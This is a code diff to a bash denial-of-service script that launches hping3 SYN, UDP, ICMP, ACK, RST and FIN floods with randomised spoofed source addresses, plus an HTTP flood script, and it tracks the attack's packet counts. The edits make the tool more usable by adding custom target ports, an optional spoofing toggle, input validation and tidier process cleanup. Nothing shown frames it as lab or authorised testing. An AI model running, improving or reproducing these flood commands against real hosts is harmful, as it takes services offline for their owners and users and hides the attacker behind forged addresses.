@@ -234,7 +234,9 @@ set_mode() {
 }
 
 get_packet_count() {
-    ifconfig "${1:-$INTERFACE}" 2>/dev/null | grep "TX packets" | awk '{print $5}' | head -1
+    local c
+    c=$(ifconfig "${1:-$INTERFACE}" 2>/dev/null | grep "TX packets" | awk '{print $5}' | head -1)
+    echo "${c:-0}"
 }
 
 monitor_attack() {
@@ -284,8 +286,8 @@ monitor_attack() {
         echo -e "${YELLOW}📊 Target Response:${NC} $PING_RESULT"
         echo ""
         
-        HPING_COUNT=$(ps aux | grep -c hping3)
-        HTTP_COUNT=$(ps aux | grep -c "http_flood.py")
+        HPING_COUNT=$(pgrep -c hping3 2>/dev/null || echo 0)
+        HTTP_COUNT=$(pgrep -cf http_flood.py 2>/dev/null || echo 0)
         echo -e "${YELLOW}🔢 Active Processes:${NC}"
         echo "   hping3: $HPING_COUNT"
         echo "   HTTP: $HTTP_COUNT"
@@ -313,9 +315,9 @@ monitor_attack() {
     
     echo -e "${YELLOW}🛑 Stopping all attacks...${NC}"
     sudo pkill -9 hping3 2>/dev/null
-    sudo pkill -9 python3 2>/dev/null
+    sudo pkill -9 -f http_flood.py 2>/dev/null
     rm -f /tmp/http_flood.py
-    
+
     local final_packets=$(get_packet_count)
     local total_sent=$((final_packets - initial_packets))
     echo ""
@@ -330,7 +332,7 @@ monitor_attack() {
 cleanup() {
     echo -e "\n${YELLOW}🛑 Stopping all attacks...${NC}"
     sudo pkill -9 hping3 2>/dev/null
-    sudo pkill -9 python3 2>/dev/null
+    sudo pkill -9 -f http_flood.py 2>/dev/null
     rm -f /tmp/http_flood.py
     echo -e "${GREEN}✅ Cleanup complete${NC}"
     exit 0
@@ -341,7 +343,18 @@ main() {
     show_banner
     parse_args "$@"
     [ -n "$MODE" ] && set_mode
-    
+
+    # Validate numeric inputs against documented ranges
+    if ! [[ "$THREADS" =~ ^[0-9]+$ ]] || [ "$THREADS" -lt 1 ] || [ "$THREADS" -gt 200 ]; then
+        echo -e "${RED}❌ Threads must be a number between 1 and 200${NC}"; exit 1
+    fi
+    if ! [[ "$PACKET_SIZE" =~ ^[0-9]+$ ]] || [ "$PACKET_SIZE" -lt 64 ] || [ "$PACKET_SIZE" -gt 65495 ]; then
+        echo -e "${RED}❌ Packet size must be between 64 and 65495${NC}"; exit 1
+    fi
+    if ! ifconfig "$INTERFACE" &>/dev/null; then
+        echo -e "${YELLOW}⚠️  Interface '$INTERFACE' not found — packet stats may show 0. Use -i to set the right one.${NC}"
+    fi
+
     echo -e "${YELLOW}Configuration:${NC}"
     echo "  Target Type: ${TARGET_TYPE^^}"
     [ "$TARGET_TYPE" = "url" ] && echo "  URL: $URL"
@@ -363,22 +376,39 @@ main() {
         echo ""
     fi
     
-    if [ "$ATTACK_TYPES" != "http" ] || [ "$ATTACK_TYPES" = "all" ]; then
+    [ "$ATTACK_TYPES" = "all" ] && ATTACK_TYPES="syn,udp,icmp,ack,rst,fin"
+
+    if echo ",$ATTACK_TYPES," | grep -qE ',(syn|udp|icmp|ack|rst|fin),'; then
         echo -e "${GREEN}Starting network layer attack on $TARGET...${NC}"
         echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
         echo ""
-        
-        [ "$ATTACK_TYPES" = "all" ] && ATTACK_TYPES="syn,udp,icmp,ack,rst,fin"
-        
+
+        # IP spoofing — disabled by --no-spoof
+        SPOOF_FLAG=""
+        [ "$SPOOF_IP" = true ] && SPOOF_FLAG="--rand-source"
+
+        # Destination ports — custom (-P) overrides the per-type defaults
+        if [ -n "$CUSTOM_PORTS" ]; then
+            TCP_PORTS=$(echo "$CUSTOM_PORTS" | tr ',' ' ')
+            UDP_PORTS="$TCP_PORTS"
+        else
+            TCP_PORTS="80"
+            UDP_PORTS="53"
+        fi
+
+        # Incrementing dst port (++) by default; --fixed-ports uses a static port
+        PP=""
+        [ "$RANDOM_PORTS" = true ] && PP="++"
+
         for i in $(seq 1 $THREADS); do
-            for type in $(echo $ATTACK_TYPES | tr ',' ' '); do
+            for type in $(echo "$ATTACK_TYPES" | tr ',' ' '); do
                 case $type in
-                    syn) sudo hping3 -S --flood --rand-source -p ++80 -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & ;;
-                    udp) sudo hping3 -2 --flood --rand-source -p ++53 -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & ;;
-                    icmp) sudo hping3 -1 --flood --rand-source -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & ;;
-                    ack) sudo hping3 -A --flood --rand-source -p 80 -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & ;;
-                    rst) sudo hping3 -R --flood --rand-source -p 80 -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & ;;
-                    fin) sudo hping3 -F --flood --rand-source -p 80 -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & ;;
+                    syn) for p in $TCP_PORTS; do sudo hping3 -S --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & done ;;
+                    udp) for p in $UDP_PORTS; do sudo hping3 -2 --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & done ;;
+                    icmp) sudo hping3 -1 --flood $SPOOF_FLAG -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & ;;
+                    ack) for p in $TCP_PORTS; do sudo hping3 -A --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & done ;;
+                    rst) for p in $TCP_PORTS; do sudo hping3 -R --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & done ;;
+                    fin) for p in $TCP_PORTS; do sudo hping3 -F --flood $SPOOF_FLAG -p ${PP}$p -d $PACKET_SIZE -i $DELAY $TARGET 2>/dev/null & done ;;
                 esac
             done
         done
